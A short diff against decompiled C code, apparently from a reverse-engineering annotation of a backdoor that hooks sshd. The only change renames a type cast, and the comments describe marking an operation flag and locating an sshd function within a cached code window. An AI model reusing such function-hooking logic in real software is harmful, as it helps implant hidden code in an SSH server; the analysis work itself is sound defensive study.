@@ -31,7 +31,7 @@ LAB_0010ab60:
   }
   else {
     // AutoDoc: Mark the shift-operation byte so later invocations bail immediately.
-    *(undefined1 *)(global_ctx + 0x141 + (ulong)operation_index) = 1;
+    *(u8 *)(global_ctx + 0x141 + (ulong)operation_index) = 1;
     // AutoDoc: Resolve the enclosing sshd function by reusing the cached `(text_start, text_end)` window from `global_ctx`.
     append_ok = find_function(code,&function_start,(void **)0x0,*(u8 **)(shared_ctx_addr + 0x80),
                           *(u8 **)(shared_ctx_addr + 0x88),FIND_NOP);
